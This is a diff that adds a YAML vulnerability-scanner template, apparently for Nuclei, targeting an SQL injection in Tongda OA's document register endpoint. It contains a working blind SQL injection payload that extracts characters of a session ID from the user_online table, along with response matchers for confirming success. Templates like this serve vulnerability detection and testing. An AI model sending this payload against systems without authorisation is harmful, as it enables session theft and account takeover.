@@ -1,0 +1,27 @@
+id: poc-yaml-tongda-oa-insert-sqli
+info:
+  name: Tongda OA Insert SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/general/document/index.php/recv/register/insert"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "title)values(\"'\"^exp(if(ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/0,1),8,1))<66,1,710)))# =1&_SERVER="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "recv/register/register_for/?rid="
+      - type: word
+        part: body
+        words:
+          - ""
+        negative: true
